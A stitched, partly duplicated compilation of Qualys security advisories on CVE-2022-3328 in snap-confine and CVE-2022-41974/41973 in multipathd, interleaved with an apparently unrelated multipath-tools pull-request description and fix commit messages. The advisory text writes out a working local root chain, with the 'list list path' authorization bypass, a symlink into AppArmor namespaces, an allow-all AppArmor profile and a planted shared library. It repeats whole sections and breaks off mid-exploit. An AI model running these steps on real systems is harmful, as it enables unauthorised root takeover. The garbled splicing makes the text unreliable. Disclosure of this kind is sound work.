352                         sc_do_mount(mnt->path, dst, NULL, MS_REC | MS_BIND,
------------------------------------------------------------------------

2/ We therefore execute two instances of snap-confine in parallel:

- we block the first snap-confine immediately after it creates its root
  directory /tmp/snap.rootfs_XXXXXX at line 291 (we reliably win this
  race condition by "single-stepping" snap-confine, as explained in our
  "Lemmings" advisory);

- we execute the second snap-confine with a snap instance name of
  rootfs_XXXXXX -- i.e., the temporary directory /tmp/snap.$SNAP_NAME of
  this second snap-confine is the root directory /tmp/snap.rootfs_XXXXXX
  of the first snap-confine;

- we kill this second snap-confine immediately after it rename()s its
  temporary directory /tmp/snap.$SNAP_NAME -- i.e., the root directory
  /tmp/snap.rootfs_XXXXXX of the first snap-confine -- at line 130 (we
  reliably win this race condition with inotify, as explained in our
  "Lemmings" advisory);

- we re-create the directory /tmp/snap.rootfs_XXXXXX ourselves, and
  resume the execution of the first snap-confine, whose root directory
  now belongs to us.

3/ We can therefore create an arbitrary symlink
/tmp/snap.rootfs_XXXXXX/tmp, and sc_bootstrap_mount_namespace() will
bind-mount the real /tmp directory (which is world-writable) onto any
directory in the filesystem (because mount() will follow our arbitrary
symlink at line 352).

This ability will eventually allow us to obtain full root privileges,
but we must first solve three problems:

------------------------------------------------------------------------
Problem a/ We cannot trick snap-confine into rename()ing
/tmp/snap.rootfs_XXXXXX, because this directory belongs to root and
must_mkdir_and_open_with_perms() rename()s it only if it does not belong
to root!

This problem solves itself naturally: indeed, /tmp/snap.rootfs_XXXXXX
belongs to the user root, but it belongs to the group of our own user,
so must_mkdir_and_open_with_perms() rename()s it because it does not
belong to the group root (at line 84).

------------------------------------------------------------------------
Problem b/ We cannot trick snap-confine into following our symlink
/tmp/snap.rootfs_XXXXXX/tmp, because sc_bootstrap_mount_namespace()
bind-mounts a read-only squashfs onto /tmp/snap.rootfs_XXXXXX (at line
319): if we create our symlink before this bind-mount, then it becomes
covered by the squashfs; and we cannot create our symlink after this
bind-mount, because the squashfs is read-only and belongs to root!

The "Prologue: CVE-2021-3996 and CVE-2021-3995 in util-linux's libmount"
of our "Lemmings" advisory suggests a solution to this problem: we must
unmount /tmp/snap.rootfs_XXXXXX each time sc_bootstrap_mount_namespace()
bind-mounts it (at lines 303 and 319). The "(deleted)" technique we used
in "Lemmings" (CVE-2021-3996 in util-linux) was patched in January 2022,
but we found a surprisingly simple workaround:

we mount a FUSE filesystem onto /tmp/snap.rootfs_XXXXXX, immediately
after we re-create this directory ourselves; this allows us to unmount
(with fusermount -u -z) any subsequent bind-mounts (even if they belong
to root), because fusermount does not check that our FUSE filesystem is
indeed the most recently mounted filesystem on /tmp/snap.rootfs_XXXXXX.

------------------------------------------------------------------------
Problem c/ We cannot trick snap-confine into bind-mounting the real /tmp
onto an arbitrary directory in the filesystem (at line 352), because
such a bind-mount is forbidden by snap-confine's AppArmor profile!

To solve this problem, we must bypass AppArmor completely, but the
technique we used in our "Lemmings" advisory (we wrapped snap-confine's
execution in an AppArmor profile that was in "complain" mode, not in
"enforce" mode) was patched in February 2022 (by commits 26eed65 and
4a2eb78, "ensure that snap-confine is in strict confinement" and
"Tighten AppArmor label check"):

now, snap-confine's execution must be wrapped in an AppArmor profile
that is in "enforce" mode and whose label matches the regular expression
"^(/snap/(snapd|core)/x?[0-9]+/usr/lib|/usr/lib(exec)?)/snapd/snap-confine$".

We were about to give up on trying to exploit snap-confine, when we
discovered CVE-2022-41974 and CVE-2022-41973 in multipathd (which is
installed by default on Ubuntu Server): these two vulnerabilities allow
us to create a directory named "failed_wwids" (user root, group root,
mode 0700) anywhere in the filesystem, and we were able to transform
this very limited directory creation into a complete AppArmor bypass.

AppArmor supports policy namespaces that are loosely related to kernel
user namespaces; by default, no AppArmor namespaces exist:

------------------------------------------------------------------------
$ ls -la /sys/kernel/security/apparmor/policy/namespaces
total 0
drwxr-xr-x 2 root root 0 Aug  6 12:42 .
drwxr-xr-x 5 root root 0 Aug  6 12:42 ..
------------------------------------------------------------------------

However, we (attackers) can create an AppArmor namespace "failed_wwids"
by exploiting CVE-2022-41974 and CVE-2022-41973 in multipathd:

------------------------------------------------------------------------
$ ln -s /sys/kernel/security/apparmor/policy/namespaces /dev/shm/multipath

$ multipathd list devices | grep 'whitelisted, unmonitored'
    sda1 devnode whitelisted, unmonitored
    ...

$ multipathd list list path sda1
fail

$ ls -la /sys/kernel/security/apparmor/policy/namespaces
total 0
drwxr-xr-x 3 root root 0 Aug  6 12:42 .
drwxr-xr-x 5 root root 0 Aug  6 12:42 ..
drwx------ 5 root root 0 Aug  6 13:38 failed_wwids
------------------------------------------------------------------------

Then, we can enter this AppArmor namespace by creating and entering an
unprivileged user namespace:

------------------------------------------------------------------------
$ aa-exec -n failed_wwids -p unconfined -- unshare -U -r /bin/sh
------------------------------------------------------------------------

Inside this namespace, we can create an AppArmor profile labeled
"/usr/lib/snapd/snap-confine" that is in "enforce" mode and allows all
possible operations:

------------------------------------------------------------------------
# apparmor_parser -K -a << "EOF"
/usr/lib/snapd/snap-confine (enforce) {
capability,
network,
mount,
remount,
umount,
pivot_root,
ptrace,
signal,
dbus,
unix,
file,
change_profile,
}
EOF
------------------------------------------------------------------------

Back in the initial namespace, we check that our "allow all" AppArmor
profile still exists:

------------------------------------------------------------------------
# aa-status
apparmor module is loaded.
32 profiles are loaded.
32 profiles are in enforce mode.
   ...
   :failed_wwids:/usr/lib/snapd/snap-confine
------------------------------------------------------------------------

Last, we make sure that snap-confine accepts our "allow all" AppArmor
profile (i.e., AppArmor is bypassed, and snap-confine is effectively
unconfined):

------------------------------------------------------------------------
$ env -i SNAPD_DEBUG=1 SNAP_INSTANCE_NAME=lxd aa-exec -n failed_wwids -p /usr/lib/snapd/snap-confine -- /usr/lib/snapd/snap-confine --base lxd snap.lxd.daemon /nonexistent
...
DEBUG: apparmor label on snap-confine is: /usr/lib/snapd/snap-confine
DEBUG: apparmor mode is: enforce
------------------------------------------------------------------------

We can therefore bind-mount /tmp onto an arbitrary directory in the
filesystem (by exploiting CVE-2022-3328); since we already depend on
multipathd to bypass AppArmor, we bind-mount /tmp onto /lib/multipath,
create our own shared library /lib/multipath/libchecktur.so, shutdown
multipathd (by exploiting CVE-2022-41974), restart multipathd (through
its Unix socket), and finally obtain full root privileges (because
multipathd executes our shared library as root when it restarts):

------------------------------------------------------------------------
$ grep multipath /proc/self/mountinfo | wc
      0       0       0

$ gcc -o CVE-2022-3328 CVE-2022-3328.c

### @mwilck **[mwilck](/mwilck)** commented [Oct 24, 2022](#issue-1420360633)

Hi [@cvaroqui](https://github.com/cvaroqui),

Here's a multipath-tools update for 0.9.2. The main parts are

* Series to fix the vulnerabilities [CVE-2022-41973](https://github.com/advisories/GHSA-6c7c-85qv-wvgp "CVE-2022-41973") ([cb57b93](https://github.com/opensvc/multipath-tools/commit/cb57b930fa690ab79b3904846634681685e3470f)) and [CVE-2022-41974](https://github.com/advisories/GHSA-46cw-54vx-86g5 "CVE-2022-41974") ([f812466](https://github.com/opensvc/multipath-tools/commit/f812466f68b8e020818c6454d7b7a7e278bc99f6)),
* Ben's series to use `queue_mode bio` for NVMeoF/TCP devices.

Note: commit [db807f3](https://github.com/opensvc/multipath-tools/commit/db807f36b6fee82ddd0b03f203f32a6b7b013ce1) has no `Reviewed-by:` tag, because I just discovered it

(but it's trivial and fixes a build bug on Fedora, so I'd rather include it in 0.9.2).

[@bmarzins](https://github.com/bmarzins) (11):

multipathd: fix read past end of of buffer in sending reply

kpartx: hold device open until partitions have been created

libmultipath: cleanup remove\_feature

libmultipath: cleanup add\_feature

multipath tests: tests for adding and removing features

libmultipath: fix queue\_mode feature handling

multipath tests: tests for reconcile\_features\_with\_queue\_mode

libmultipath: prepare proto\_id for use by non-scsi devivces

libmultipath: get nvme path transport protocol

libmultipath: enforce queue\_mode bio for nmve:tcp paths

libmultipath: don't print garbage keywords

[@Hi-Angel](https://github.com/Hi-Angel) (1):

README.md: mention libreadline and libedit optional deps (Fixes [#44](https://github.com/opensvc/multipath-tools/pull/44))

[@mwilck](https://github.com/mwilck) (9):

multipathd: more robust command parsing

multipathd: fix command completion with robust parser

multipath-tools tests: add test for command parsing

multipath-tools: use /run instead of /dev/shm

multipathd: uxlsnr: fix memory leak handling invalid commands

libmultipath: bump library version

mpathpersist: fix compilation error with clang 15

libmultipath: bump version to 0.9.2

[@xosevp](https://github.com/xosevp) (2):

multipath-tools: add more info for NetApp RDAC arrays

multipath-tools: update man pages with last modification date

Sorry, something went wrong.

The current parser allows commands like \"path sda show\" or \"list list
add path sda\", because it doesn't enforce ordering of the keywords
and simply adds rather than or-s the values of the keys.

Rework this by using a separate byte for the \"verb\" and the allowed
qualifiers in the different positions of the command. No command
needs more than 3 qualifiers, so we disallow command vectors with
more than 4 elements, and change the type of the fingerprint to
uint32_t.

init_callbacks() is now required in both multipathc and multipathd
to initialize the table of handlers and fingerprints. But as m
ultipathc never calls any handler, we need not link the
entire handlers code into it.

nvme:tcp devices set BLK_MQ_F_BLOCKING (they are the only block devices
which multipath supports that do so), meaning that block_mq expects that
they can block at certain points while servicing a request.  However,
due to the way device-mapper sets up its queue, it is not able to set
BLK_MQ_F_BLOCKING when it includes paths that set this flag.  Patches
were written to address this issue but they were rejected upstream

https://lore.kernel.org/linux-block/YcH%2FE4JNag0QYYAa@infradead.org/T/#t

The proposed solution was to have multipath use the bio queue_mode for
multipath devices that include nvme:tcp paths.

Multipath devices now automatically add the \"queue_mode bio\" feature if
they include nvme:tcp paths.  If a multipath devices was created with
\"queue_mode rq\", it will disallow the addition of nvme:tcp paths.

Qualys Security Advisory

Leeloo Multipath: Authorization bypass and symlink attack in multipathd
(CVE-2022-41974 and CVE-2022-41973)

========================================================================
Contents
========================================================================

Summary
CVE-2022-41974: Authorization bypass
CVE-2022-41973: Symlink attack
Acknowledgments
Timeline

========================================================================
Summary
========================================================================

We discovered two local vulnerabilities (an authorization bypass and a
symlink attack) in multipathd, a daemon that is running as root in the
default installation of (for example) Ubuntu Server:

<https://ubuntu.com/server/docs/device-mapper-multipathing-introduction>
<https://github.com/opensvc/multipath-tools>

We combined these two vulnerabilities with a third vulnerability, in
another package that is also installed by default on Ubuntu Server, and
obtained full root privileges on Ubuntu Server 22.04; other releases are
probably also exploitable. We will publish this third vulnerability, and
the complete details of this local privilege escalation, in an upcoming
advisory.

The authorization bypass (CVE-2022-41974) was introduced in February
2017 (version 0.7.0) by commit 9acda0c ("Perform socket client uid check
on IPC commands"), but earlier versions perform no authorization checks
at all: any unprivileged local user can issue any privileged command to
multipathd.

The symlink attack (CVE-2022-41973) was introduced in May 2018 (version
0.7.7) by commit 65d0a63 ("functions to indicate mapping failure in
/dev/shm"); the vulnerable code was hardened significantly in May 2020
(version 0.8.5) by commit 40ee3ea ("simplify failed wwid code"), but it
remains exploitable nonetheless.

========================================================================
CVE-2022-41974: Authorization bypass
========================================================================

The multipathd daemon listens for client connections on an abstract Unix
socket (conveniently, the multipathd binary itself can act as a client,
if executed with non-option arguments; we use this feature extensively
in this advisory to connect and send commands to the multipathd daemon):

------------------------------------------------------------------------
$ ps -ef | grep 'multipath[d]'
root         377       1  0 13:55 ?        00:00:00 /sbin/multipathd -d -s

$ ss -l -x | grep 'multipathd'
u_str LISTEN 0      4096        @/org/kernel/linux/storage/multipathd 18105
------------------------------------------------------------------------

The commands sent by a client to multipathd are composed of keywords,
and internally, each keyword is identified by a different bit; for
example, "list" is 1 (1<<0), "add" is 2 (1<<1), and "path" (which
requires a parameter) is 65536 (1<<16):

------------------------------------------------------------------------
155 load_keys (void)
...
163         r += add_key(keys, "list", LIST, 0);
164         r += add_key(keys, "show", LIST, 0);
165         r += add_key(keys, "add", ADD, 0);
...
183         r += add_key(keys, "path", PATH, 1);
------------------------------------------------------------------------
 53 #define LIST            (1ULL << __LIST)
 54 #define ADD             (1ULL << __ADD)
 ..
 69 #define PATH            (1ULL << __PATH)
------------------------------------------------------------------------
  6 enum {
  7         __LIST,                 /*  0 */
  8         __ADD,
 ..
 23         __PATH,
------------------------------------------------------------------------

In turn, each command is associated with a handler (a C function) by its
fingerprint -- the bitwise OR of its constituent keywords; for example,
the command "list path PARAM" is associated with cli_list_path() by the
fingerprint 65537 (LIST+PATH=1+65536), and the command "add path PARAM"
is associated with cli_add_path() by the fingerprint 65538
(ADD+PATH=2+65536):

------------------------------------------------------------------------
1522 void init_handler_callbacks(void)
....
1527         set_handler_callback(LIST+PATH, cli_list_path);
....
1549         set_handler_callback(ADD+PATH, cli_add_path);
------------------------------------------------------------------------
321 static uint64_t
322 fingerprint(const struct _vector *vec)
...
325         uint64_t fp = 0;
...
331         vector_foreach_slot(vec, kw, i)
332                 fp += kw->code;
333
334         return fp;
------------------------------------------------------------------------
 89 static struct handler *
 90 find_handler (uint64_t fp)
 ..
 95         vector_foreach_slot (handlers, h, i)
 96                 if (h->fingerprint == fp)
 97                         return h;
 98
 99         return NULL;
------------------------------------------------------------------------

When multipathd receives a command from a client, it first performs an
authentication check and an authorization check (both at line 491):

------------------------------------------------------------------------
431 static int client_state_machine(struct client *c, struct vectors *vecs,
...
485         case CLT_PARSE:
486                 c->error = parse_cmd(c);
487                 if (!c->error) {
...
491                         if (!c->is_root && kw->code != LIST) {
492                                 c->error = -EPERM;
...
495                         }
496                 }
497                 if (c->error)
...
501                 else
502                         set_client_state(c, CLT_WORK);
...
522         case CLT_WORK:
523                 c->error = execute_handler(c, vecs);
------------------------------------------------------------------------

- Authentication: if the client's UID (obtained from SO_PEERCRED) is 0
  (i.e., if is_root is true), then the client is privileged; otherwise,
  it is unprivileged.

- Authorization: if the client is privileged, it is allowed to execute
  any commands; otherwise, only unprivileged LIST commands are allowed
  (i.e., commands whose first keyword is either "list" or "show").

Attentive readers may have noticed that multipathd does not, in fact,
calculate the fingerprint of a command by bitwise-ORing its constituent
keywords, but by arithmetic-ADDing them (at line 332). While these two
operations are equivalent if no keyword is repeated, we (attackers) can
send a seemingly unprivileged command (whose first keyword is "list")
but whose fingerprint matches a privileged command (by repeating the
"list" keyword): we can exploit this flaw to bypass multipathd's
authorization check.

For example, we are not allowed to execute "add path PARAM" (whose
fingerprint is 2+65536=65538) because the first keyword is not "list",
but we are allowed to execute the equivalent "list list path PARAM"
(whose fingerprint is also 1+1+65536=65538, instead of 1|1|65536=65537)
because the first keyword is "list" (the multipathd daemon below replies
"blacklisted" because PARAM is an invalid path, not because the command
is denied):

------------------------------------------------------------------------
$ multipathd add path PARAM
permission deny: need to be root

$ multipathd list list path PARAM
blacklisted
------------------------------------------------------------------------

This authorization bypass greatly enlarges the attack surface of
multipathd: 34 privileged command handlers become available to local
attackers, in addition to the 23 unprivileged command handlers that are
normally available. We audited only a few of these command handlers,
because we quickly discovered a low-hanging vulnerability (a symlink
attack) in one of them.

========================================================================
CVE-2022-41973: Symlink attack
========================================================================

multipathd operates insecurely, as root, in /dev/shm (a sticky,
world-writable directory similar to /tmp). The vulnerable code (in
mark_failed_wwid()) may be executed during the normal lifetime of
multipathd, but a local attacker can force its execution by exploiting
the authorization bypass CVE-2022-41974; for example, by adding a
"whitelisted, unmonitored" device to multipathd:

------------------------------------------------------------------------
$ multipathd list devices | grep 'whitelisted, unmonitored'
    sda1 devnode whitelisted, unmonitored
    ...

$ multipathd list list path sda1
fail
------------------------------------------------------------------------

This command, which is equivalent to "add path sda1", results in the
following system-call trace (strace) of the multipathd daemon:

------------------------------------------------------------------------
386 openat(AT_FDCWD, "/dev/shm/multipath/failed_wwids", O_RDONLY|O_DIRECTORY) = -1 ENOENT (No such file or directory)
387 mkdir("/dev", 0700)                     = -1 EEXIST (File exists)
388 mkdir("/dev/shm", 0700)                 = -1 EEXIST (File exists)
389 mkdir("/dev/shm/multipath", 0700)       = 0
390 mkdir("/dev/shm/multipath/failed_wwids", 0700) = 0
391 openat(AT_FDCWD, "/dev/shm/multipath/failed_wwids", O_RDONLY|O_DIRECTORY) = 12
392 getpid()                                = 375
393 openat(12, "VBOX_HARDDISK_VB60265ca5-df119cb6.177", O_RDONLY|O_CREAT|O_EXCL, 0400) = 13
394 close(13)                               = 0
395 linkat(12, "VBOX_HARDDISK_VB60265ca5-df119cb6.177", 12, "VBOX_HARDDISK_VB60265ca5-df119cb6", 0) = 0
396 unlinkat(12, "VBOX_HARDDISK_VB60265ca5-df119cb6.177", 0) = 0
397 close(12)                               = 0
------------------------------------------------------------------------

- at line 389, the directory "/dev/shm/multipath" is created, if it does
  not exist already;

- at line 390, the directory "/dev/shm/multipath/failed_wwids" is
  created, if it does not exist already;

- at lines 391-397, the empty file
  "/dev/shm/multipath/failed_wwids/VBOX_HARDDISK_VB60265ca5-df119cb6" is
  created, if it does not exist already (its name is the "World Wide ID"
  of the added device).

multipathd is therefore vulnerable to two different symlink attacks:

1/ if we (attackers) create an arbitrary symlink "/dev/shm/multipath",
then we can create a directory named "failed_wwids" (user root, group
root, mode 0700) anywhere in the filesystem;

2/ if we create an arbitrary symlink "/dev/shm/multipath/failed_wwids",
then we can create a file named "VBOX_HARDDISK_VB60265ca5-df119cb6"
(user root, group root, mode 0400, size 0) anywhere in the filesystem.

These two symlink attacks are very weak, because we do not control the
name, user, group, mode, or contents of the directory or file that we
create; only its location. Despite these limitations, we were able to
combine multipathd's vulnerabilities (authorization bypass and symlink
attack) with a third vulnerability (in another package), and obtained
full root privileges on Ubuntu Server 22.04; we will publish this third
vulnerability in an upcoming advisory.

Side note: initially, we thought that the symlink attack 1/ would fail,
because /dev/shm is a sticky world-writable directory, and the kernel's
fs.protected_symlinks is 1 by default; to our great surprise, however,
it succeeded. Eventually, we understood that only the final component of
a path is protected, not its intermediate components; for example, if
/tmp/foo is a symlink, then an access to /tmp/foo itself is protected,
but an access to /tmp/foo/bar is not. Interestingly, this weakness was
already pointed out in 2017 by Solar Designer, and the original
Openwall, grsecurity, and Yama protections are not affected:

    I can't help but feel a missed opportunity to integrate lyrics from

        -- <https://twitter.com/spendergrsec/status/1494420041076461570>

========================================================================
Summary
========================================================================

We discovered a race condition (CVE-2022-3328) in snap-confine, a
SUID-root program installed by default on Ubuntu. In this advisory, we
tell the story of this vulnerability (which was introduced in February
2022 by the patch for CVE-2021-44731) and detail how we exploited it in
Ubuntu Server (a local privilege escalation, from any user to root) by
combining it with two vulnerabilities in multipathd (an authorization
bypass and a symlink attack, CVE-2022-41974 and CVE-2022-41973):

<https://www.qualys.com/2022/10/24/leeloo-multipath/leeloo-multipath.txt>

========================================================================
Background
========================================================================

    Like the crack of the whip, I Snap! attack
    Radical mind, day and night all the time
        -- SNAP! - The Power

In February 2022, we published CVE-2021-44731 in our "Lemmings" advisory
(<https://www.qualys.com/2022/02/17/cve-2021-44731/oh-snap-more-lemmings.txt>):
to set up a snap's sandbox, snap-confine created the temporary directory
/tmp/snap.$SNAP_NAME or reused it if it already existed, even if it did
not belong to root; a local attacker could race against snap-confine,
retain control over /tmp/snap.$SNAP_NAME, and eventually obtain full
root privileges.

This vulnerability was patched by commit acb2b4c ("cmd/snap-confine:
Prevent user-controlled race in setup_private_mount"), which introduced
a new helper function, must_mkdir_and_open_with_perms():

------------------------------------------------------------------------
142 static void setup_private_mount(const char *snap_name)
...
169         sc_must_snprintf(base_dir, sizeof(base_dir), "/tmp/snap.%s", snap_name);
...
176         base_dir_fd = must_mkdir_and_open_with_perms(base_dir, 0, 0, 0700);
------------------------------------------------------------------------
 55 static int must_mkdir_and_open_with_perms(const char *dir, uid_t uid, gid_t gid,
 56                                           mode_t mode)
 ..
 61  mkdir:
 ..
 67         if (mkdir(dir, 0700) < 0 && errno != EEXIST) {
 ..
 70         fd = open(dir, O_RDONLY | O_DIRECTORY | O_CLOEXEC | O_NOFOLLOW);
 ..
 81         if (fstat(fd, &st) < 0) {
 ..
 84         if (st.st_uid != uid || st.st_gid != gid
 85             || st.st_mode != (S_IFDIR | mode)) {
...
130                 if (rename(dir, random_dir) < 0) {
...
135                 goto mkdir;
------------------------------------------------------------------------

- the temporary directory /tmp/snap.$SNAP_NAME is created at line 67, if
  it does not exist already;

- if it already exists, and if it does not belong to root (at line 84),
  then it is moved out of the way (at line 130) by rename()ing it to a
  random directory in /tmp, and its creation is retried (at line 135).

When we reviewed this patch back in December 2021, we felt very nervous
about this rename() call (because it allows a local attacker to rename()
a directory they do not own), and we advised the Ubuntu Security Team to
either not reuse the directory /tmp/snap.$SNAP_NAME at all, or to create
it in a non-world-writable directory instead of /tmp, or at least to use
renameat2(RENAME_EXCHANGE) instead of rename(). Unfortunately, all of
these ideas were deemed impractical (for example, renameat2() is not
supported by older kernel and glibc versions); moreover, we (Qualys)
failed to come up with a feasible attack plan against this rename()
call, so the patch was kept in its current form.

After the release of Ubuntu 22.04 in April 2022, we decided to revisit
snap-confine and its recent hardening changes, and we finally found a
way to exploit the rename() call in must_mkdir_and_open_with_perms().

    It's getting, it's getting, it's getting kinda hectic
        -- SNAP! - The Power

The three key ideas to exploit the rename() of /tmp/snap.$SNAP_NAME are:

1/ snap-confine operates in /tmp to create a snap's temporary directory
(/tmp/snap.$SNAP_NAME in setup_private_mount()), but it also operates in
/tmp to create the snap's *root* directory (/tmp/snap.rootfs_XXXXXX in
sc_bootstrap_mount_namespace(), where all of the Xs are randomized by
mkdtemp()), and the string rootfs_XXXXXX is accepted as a valid snap
instance name by sc_instance_name_validate() (when all of the Xs are
lowercase alphanumeric):

------------------------------------------------------------------------
286 static void sc_bootstrap_mount_namespace(const struct sc_mount_config *config)
...
288         char scratch_dir[] = "/tmp/snap.rootfs_XXXXXX";
...
291         if (mkdtemp(scratch_dir) == NULL) {
...
303         sc_do_mount(scratch_dir, scratch_dir, NULL, MS_BIND, NULL);
...
319         sc_do_mount(config->rootfs_dir, scratch_dir, NULL, MS_REC | MS_BIND,
...
331         for (const struct sc_mount * mnt = config->mounts; mnt->path != NULL;
...
342                 sc_must_snprintf(dst, sizeof dst, "%s/%s", scratch_dir,
343                                  mnt->path);
...
352                         sc_do_mount(mnt->path, dst, NULL, MS_REC | MS_BIND,
------------------------------------------------------------------------

2/ We therefore execute two instances of snap-confine in parallel:

- we block the first snap-confine immediately after it creates its root
  directory /tmp/snap.rootfs_XXXXXX at line 291 (we reliably win this
  race condition by "single-stepping" snap-confine, as explained in our
  "Lemmings" advisory);

- we execute the second snap-confine with a snap instance name of
  rootfs_XXXXXX -- i.e., the temporary directory /tmp/snap.$SNAP_NAME of
  this second snap-confine is the root directory /tmp/snap.rootfs_XXXXXX
  of the first snap-confine;

- we kill this second snap-confine immediately after it rename()s its
  temporary directory /tmp/snap.$SNAP_NAME -- i.e., the root directory
  /tmp/snap.rootfs_XXXXXX of the first snap-confine -- at line 130 (we
  reliably win this race condition with inotify, as explained in our
  "Lemmings" advisory);

- we re-create the directory /tmp/snap.rootfs_XXXXXX ourselves, and
  resume the execution of the first snap-confine, whose root directory
  now belongs to us.

3/ We can therefore create an arbitrary symlink
/tmp/snap.rootfs_XXXXXX/tmp, and sc_bootstrap_mount_namespace() will
bind-mount the real /tmp directory (which is world-writable) onto any
directory in the filesystem (because mount() will follow our arbitrary
symlink at line 352).

This ability will eventually allow us to obtain full root privileges,
but we must first solve three problems:

------------------------------------------------------------------------
Problem a/ We cannot trick snap-confine into rename()ing
/tmp/snap.rootfs_XXXXXX, because this directory belongs to root and
must_mkdir_and_open_with_perms() rename()s it only if it does not belong
to root!

This problem solves itself naturally: indeed, /tmp/snap.rootfs_XXXXXX
belongs to the user root, but it belongs to the group of our own user,
so must_mkdir_and_open_with_perms() rename()s it because it does not
belong to the group root (at line 84).

------------------------------------------------------------------------
Problem b/ We cannot trick snap-confine into following our symlink
/tmp/snap.rootfs_XXXXXX/tmp, because sc_bootstrap_mount_namespace()
bind-mounts a read-only squashfs onto /tmp/snap.rootfs_XXXXXX (at line
319): if we create our symlink before this bind-mount, then it becomes
covered by the squashfs; and we cannot create our symlink after this
bind-mount, because the squashfs is read-only and belongs to root!

The "Prologue: CVE-2021-3996 and CVE-2021-3995 in util-linux's libmount"
of our "Lemmings" advisory suggests a solution to this problem: we must
unmount /tmp/snap.rootfs_XXXXXX each time sc_bootstrap_mount_namespace()
bind-mounts it (at lines 303 and 319). The "(deleted)" technique we used
in "Lemmings" (CVE-2021-3996 in util-linux) was patched in January 2022,
but we found a surprisingly simple workaround:

we mount a FUSE filesystem onto /tmp/snap.rootfs_XXXXXX, immediately
after we re-create this directory ourselves; this allows us to unmount
(with fusermount -u -z) any subsequent bind-mounts (even if they belong
to root), because fusermount does not check that our FUSE filesystem is
indeed the most recently mounted filesystem on /tmp/snap.rootfs_XXXXXX.

------------------------------------------------------------------------
Problem c/ We cannot trick snap-confine into bind-mounting the real /tmp
onto an arbitrary directory in the filesystem (at line 352), because
such a bind-mount is forbidden by snap-confine's AppArmor profile!

To solve this problem, we must bypass AppArmor completely, but the
technique we used in our "Lemmings" advisory (we wrapped snap-confine's
execution in an AppArmor profile that was in "complain" mode, not in
"enforce" mode) was patched in February 2022 (by commits 26eed65 and
4a2eb78, "ensure that snap-confine is in strict confinement" and
"Tighten AppArmor label check"):

now, snap-confine's execution must be wrapped in an AppArmor profile
that is in "enforce" mode and whose label matches the regular expression
"^(/snap/(snapd|core)/x?[0-9]+/usr/lib|/usr/lib(exec)?)/snapd/snap-confine$".

We were about to give up on trying to exploit snap-confine, when we
discovered CVE-2022-41974 and CVE-2022-41973 in multipathd (which is
installed by default on Ubuntu Server): these two vulnerabilities allow
us to create a directory named "failed_wwids" (user root, group root,
mode 0700) anywhere in the filesystem, and we were able to transform
this very limited directory creation into a complete AppArmor bypass.

AppArmor supports policy namespaces that are loosely related to kernel
user namespaces; by default, no AppArmor namespaces exist:

------------------------------------------------------------------------
$ ls -la /sys/kernel/security/apparmor/policy/namespaces
total 0
drwxr-xr-x 2 root root 0 Aug  6 12:42 .
drwxr-xr-x 5 root root 0 Aug  6 12:42 ..
------------------------------------------------------------------------

However, we (attackers) can create an AppArmor namespace "failed_wwids"
by exploiting CVE-2022-41974 and CVE-2022-41973 in multipathd:

------------------------------------------------------------------------
$ ln -s /sys/kernel/security/apparmor/policy/namespaces /dev/shm/multipath

$ multipathd list devices | grep 'whitelisted, unmonitored'
    sda1 devnode whitelisted, unmonitored
    ...

$ multipathd list list path sda1
fail

$ ls -la /sys/kernel/security/apparmor/policy/namespaces
total 0
drwxr-xr-x 3 root root 0 Aug  6 12:42 .
drwxr-xr-x 5 root root 0 Aug  6 12:42 ..
drwx------ 5 root root 0 Aug  6 13:38 failed_wwids
------------------------------------------------------------------------

Then, we can enter this AppArmor namespace by creating and entering an
unprivileged user namespace:

------------------------------------------------------------------------
$ aa-exec -n failed_wwids -p unconfined -- unshare -U -r /bin/sh
------------------------------------------------------------------------

Inside this namespace, we can create an AppArmor profile labeled
"/usr/lib/snapd/snap-confine" that is in "enforce" mode and allows all
possible operations:

------------------------------------------------------------------------
# apparmor_parser -K -a << "EOF"
/usr/lib/snapd/snap-confine (enforce) {
capability,
network,
mount,
remount,
umount,
pivot_root,
ptrace,
signal,
dbus,
unix,
file,
change_profile,
}
EOF
------------------------------------------------------------------------

Back in the initial namespace, we check that our "allow all" AppArmor
profile still exists:

------------------------------------------------------------------------
# aa-status
apparmor module is loaded.
32 profiles are loaded.
32 profiles are in enforce mode.
   ...
   :failed_wwids:/usr/lib/snapd/snap-confine
------------------------------------------------------------------------

Last, we make sure that snap-confine accepts our "allow all" AppArmor
profile (i.e., AppArmor is bypassed, and snap-confine is effectively
unconfined):

------------------------------------------------------------------------
$ env -i SNAPD_DEBUG=1 SNAP_INSTANCE_NAME=lxd aa-exec -n failed_wwids -p /usr/lib/snapd/snap-confine --
/usr/lib/snapd/snap-confine --base lxd snap.lxd.daemon /nonexistent
...
DEBUG: apparmor label on snap-confine is: /usr/lib/snapd/snap-confine
DEBUG: apparmor mode is: enforce
------------------------------------------------------------------------

We can therefore bind-mount /tmp onto an arbitrary directory in the
filesystem (by exploiting CVE-2022-3328); since we already depend on
multipathd to bypass AppArmor, we bind-mount /tmp onto /lib/multipath,
create our own shared library /lib/multipath/libchecktur.so, shutdown
multipathd (by exploiting CVE-2022-41974), restart multipathd (through
its Unix socket), and finally obtain full root privileges (because
multipathd executes our shared library as root when it restarts):

------------------------------------------------------------------------
$ grep multipath /proc/self/mountinfo | wc
      0       0       0

$ gcc -o CVE-2022-3328 CVE-2022-3328.c

multipathd: more robust command parsing

```
The current parser allows commands like "path sda show" or "list list
add path sda", because it doesn't enforce ordering of the keywords
and simply adds rather than or-s the values of the keys.

Rework this by using a separate byte for the "verb" and the allowed
qualifiers in the different positions of the command. No command
needs more than 3 qualifiers, so we disallow command vectors with
more than 4 elements, and change the type of the fingerprint to
uint32_t.

init_callbacks() is now required in both multipathc and multipathd
to initialize the table of handlers and fingerprints. But as m
ultipathc never calls any handler, we need not link the
entire handlers code into it.
